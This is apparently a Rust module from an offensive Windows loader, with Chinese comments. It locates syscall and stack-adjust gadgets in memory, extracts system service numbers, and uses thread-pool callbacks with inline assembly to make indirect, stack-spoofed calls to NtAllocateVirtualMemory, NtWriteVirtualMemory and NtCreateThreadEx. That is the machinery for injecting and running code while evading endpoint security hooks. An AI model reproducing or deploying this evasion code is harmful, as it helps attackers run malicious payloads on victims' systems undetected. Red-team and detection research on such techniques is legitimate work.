use std::arch::{asm, global_asm};
use std::os::raw::c_ulong;
use std::ptr::addr_of;

use winapi::shared::basetsd::SIZE_T;
use winapi::shared::ntdef::{NTSTATUS, OBJECT_ATTRIBUTES, PVOID};
use winapi::um::winnt::{
    ACCESS_MASK, HANDLE, PTP_CALLBACK_ENVIRON, PTP_CALLBACK_INSTANCE, PTP_WORK, PTP_WORK_CALLBACK,
};

use crate::{
    ADD_RSP_RET, NTALLOCATE_VIRTUAL_MEMORY_ARGS, NTWRITE_VIRTUAL_MEMORY_ARGS,
    NT_CREATE_THREAD_EX_ARGS, SYSCALL_ADDRESS,
};

pub type DWORD = c_ulong;
pub type __uint64 = u64;
pub type DWORD64 = __uint64;
pub type UINT_PTR = __uint64;
pub type PTpAllocWork = unsafe extern "system" fn(
    work_return: &PTP_WORK,
    callback: PTP_WORK_CALLBACK,
    context: PVOID,
    callback_environ: PTP_CALLBACK_ENVIRON,
) -> NTSTATUS;
pub type PTpPostWork = unsafe extern "system" fn(work: PTP_WORK);
pub type PTpReleaseWork = unsafe extern "system" fn(work: PTP_WORK);

#[repr(C)]
pub struct NTAllocateVirtualMemoryArgs {
    pub h_process: HANDLE,
    pub address: *mut PVOID,
    pub zero_bits: usize,
    pub size: *mut SIZE_T,
    pub allocation_type: usize,
    pub permissions: usize,
    pub ssn: DWORD,
}
#[repr(C)]
pub struct NtWriteVirtualMemoryArgs {
    pub h_process: HANDLE,
    pub address: *mut PVOID,
    pub buffer: *const PVOID,
    pub number_of_bytes_to_write: u32,
    pub number_of_bytes_written: *mut u32,
    pub ssn: DWORD,
}

#[repr(C)]
pub struct NtCreateThreadExArgs {
    pub thread_handle: *mut HANDLE,
    pub desired_access: ACCESS_MASK,
    pub object_attributes: *const OBJECT_ATTRIBUTES,
    pub process_handle: HANDLE,
    pub lp_start_address: PVOID,
    pub lp_parameter: PVOID,
    pub flags: usize,
    pub stack_zero_bits: usize,
    pub size_of_stack_commit: usize,
    pub size_of_stack_reserve: usize,
    pub lp_bytes_buffer: PVOID,
    pub ssn: DWORD,
}
pub unsafe fn search_for_syscall(start_addr: usize) {
    // 将目标字节序列转换为数组
    // syscall,ret
    let target_bytes: [u8; 3] = [0x0F, 0x05, 0xC3];

    // 创建原始指针，并声明为可变变量
    let mut ptr = start_addr as *const u8;

    // 逐个比较内存中的字节
    loop {
        // 解引用指针获取当前字节的值
        let current_byte = *ptr;

        // 检查当前字节是否与目标字节序列的第一个字节相等
        if current_byte == target_bytes[0] {
            // 获取指向当前字节的原始指针
            let mut temp_ptr = ptr;

            // 检查接下来的字节是否与目标字节序列匹配
            let mut flag: bool = true;
            for &byte in &target_bytes[1..] {
                temp_ptr = temp_ptr.add(1);
                if *temp_ptr != byte {
                    flag = false;
                    break;
                }
            }

            // 如果找到了目标字节序列，则打印并退出循环
            if flag == true {
                SYSCALL_ADDRESS = ptr as usize;
                break;
            }
        }
        // 移动指针到下一个字节
        ptr = ptr.add(1);

        // 如果到达内存末尾，则退出循环
        if ptr.is_null() {
            println!("Reached end of memory!");
            break;
        }
    }
}

pub unsafe fn search_for_add_rsp(start_addr: usize) {
    // 将目标字节序列转换为数组
    // 48 83 C4 78 C3
    //add rsp,78h,ret
    let target_bytes: [u8; 5] = [0x48, 0x83, 0xc4, 0x78, 0xc3];

    // 创建原始指针，并声明为可变变量
    let mut ptr = start_addr as *const u8;

    // 逐个比较内存中的字节
    loop {
        // 解引用指针获取当前字节的值
        let current_byte = *ptr;
        // 检查当前字节是否与目标字节序列的第一个字节相等
        if current_byte == target_bytes[0] {
            // 获取指向当前字节的原始指针
            let mut temp_ptr = ptr;
            // 检查接下来的字节是否与目标字节序列匹配
            let mut flag: bool = true;
            for &byte in &target_bytes[1..] {
                temp_ptr = temp_ptr.add(1);
                if *temp_ptr != byte {
                    flag = false;
                    break;
                }
            }
            // 如果找到了目标字节序列，则打印并退出循环
            if flag == true {
                ADD_RSP_RET = ptr as usize;
                break;
            }
        }
        // 移动指针到下一个字节
        ptr = ptr.add(1);

        // 如果到达内存末尾，则退出循环
        if ptr.is_null() {
            println!("Reached end of memory!");
            break;
        }
    }
}

pub unsafe fn get_ssn_by_func_address(function_address: HANDLE) -> DWORD {
    let target_bytes: [u8; 4] = [0x4C, 0x8B, 0xD1, 0xB8];
    // 创建原始指针，并声明为可变变量
    let mut ptr = function_address as *const u8;

    // 逐个比较内存中的字节
    loop {
        // 解引用指针获取当前字节的值
        let current_byte = *ptr;

        // 检查当前字节是否与目标字节序列的第一个字节相等
        if current_byte == target_bytes[0] {
            // 获取指向当前字节的原始指针
            let mut temp_ptr = ptr;

            // 检查接下来的字节是否与目标字节序列匹配
            let mut flag: bool = true;
            for &byte in &target_bytes[1..] {
                temp_ptr = temp_ptr.add(1);
                if *temp_ptr != byte {
                    flag = false;
                    break;
                }
            }

            // 如果找到了目标字节序列，则打印并退出循环
            if flag == true {
                return *ptr.add(4) as DWORD;
            }
        }
        // 移动指针到下一个字节
        ptr = ptr.add(1);

        // 如果到达内存末尾，则退出循环
        if ptr.is_null() {
            println!("Reached end of memory!");
            break;
        }
    }
    return 0;
}
//r15
#[inline(never)]
pub unsafe fn nt_allocate_virtual_memory_callback(
    instance: PTP_CALLBACK_INSTANCE,
    context: PVOID,
    work: PTP_WORK,
) {
    // // 全局变量，否则当堆栈变化时，rust编译器找不到局部变量的值
    // let args = &*(context as *mut NTAllocateVirtualMemoryArgs);
    // NTALLOCATE_VIRTUAL_MEMORY_ARGS = NTAllocateVirtualMemoryArgs{
    //     h_process: args.h_process,
    //     address: args.address,
    //     zero_bits: args.zero_bits,
    //     size: args.size,
    //     allocation_type: args.allocation_type,
    //     permissions: args.permissions,
    //     ssn: args.ssn,
    // };
    //  64位下入栈规则:前四个参数rcx rdx r8 r9 r10 后面的放入堆栈,[rsp+0x28],[rsp+0x30]....
    //  参考链接:https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/windows-x64-calling-convention-stack-frame
    asm!(
    "add rsp, 0x18",        //消除当前函数堆栈
    "sub rsp, 0x78",        //构造新栈
    "push r15",
    "mov [rsp+0x30], r10",  //6th arg
    "mov [rsp+0x28], r11",  //5th arg
    "mov r10, rcx",
    "jmp r14",              //jmp 到syscall
    in("r15") ADD_RSP_RET,
    in("rcx") NTALLOCATE_VIRTUAL_MEMORY_ARGS.h_process,
    in("rdx") NTALLOCATE_VIRTUAL_MEMORY_ARGS.address,
    in("r8") NTALLOCATE_VIRTUAL_MEMORY_ARGS.zero_bits,
    in("r9") NTALLOCATE_VIRTUAL_MEMORY_ARGS.size,
    in("r11") NTALLOCATE_VIRTUAL_MEMORY_ARGS.allocation_type,
    in("r10") NTALLOCATE_VIRTUAL_MEMORY_ARGS.permissions,
    in("r14") SYSCALL_ADDRESS,
    in("rax") NTALLOCATE_VIRTUAL_MEMORY_ARGS.ssn,
    );
}
#[inline(never)]
pub unsafe fn nt_write_virtual_memory_callback(
    instance: PTP_CALLBACK_INSTANCE,
    context: PVOID,
    work: PTP_WORK,
) {
    asm!(
    "add rsp, 0x18",
    "sub rsp, 0x78",
    "push r15",
    "mov [rsp+0x28], r11",  //5th arg
    "mov r10, rcx",
    "jmp r12",              //jmp 到syscall
    in("r15") ADD_RSP_RET,
    in("rcx") NTWRITE_VIRTUAL_MEMORY_ARGS.h_process,
    in("rdx") NTWRITE_VIRTUAL_MEMORY_ARGS.address,
    in("r8") NTWRITE_VIRTUAL_MEMORY_ARGS.buffer,
    in("r9") NTWRITE_VIRTUAL_MEMORY_ARGS.number_of_bytes_to_write,
    in("r11") NTWRITE_VIRTUAL_MEMORY_ARGS.number_of_bytes_written,
    in("rax") NTWRITE_VIRTUAL_MEMORY_ARGS.ssn,
    in("r12") SYSCALL_ADDRESS,
    );
}
#[inline(never)]
pub unsafe fn nt_create_thread_ex_callback(
    instance: PTP_CALLBACK_INSTANCE,
    context: PVOID,
    work: PTP_WORK,
) {
    asm!(
    "add rsp,0x18",
    "sub rsp,0x78",
    "push r15",
    "mov rcx, [r11]",               //1th arg
    "mov rdx, [r11 + 0x08]",        //2th arg
    "mov r8, [r11 + 0x10]",         //3th arg
    "mov r9, [r11 + 0x18]",         //4th arg
    "mov r10,[r11 + 0x20]",         //5th arg
    "mov [rsp + 0x28],r10",
    "mov r10, [r11 + 0x28]",        //6th arg
    "mov [rsp + 0x30], r10",
    "mov r10, [r11 + 0x30]",        //7th arg
    "mov [rsp + 0x38], r10",
    "mov r10, [r11 + 0x38]",        //8th arg
    "mov [rsp + 0x40], r10",
    "mov r10, [r11 + 0x40]",        //9th arg
    "mov [rsp + 0x48], r10",
    "mov r10, [r11 + 0x48]",        //10th arg
    "mov [rsp + 0x50], r10",
    "mov r10, [r11 + 0x50]",        //11th arg
    "mov [rsp + 0x58], r10",
    "mov rax, [r11 + 0x58]",
    "mov r10, rcx",
    "jmp r14",
    in("r15") crate::ADD_RSP_RET,
    in("r11") addr_of!(NT_CREATE_THREAD_EX_ARGS),
    in("r14") crate::SYSCALL_ADDRESS,
    );
}


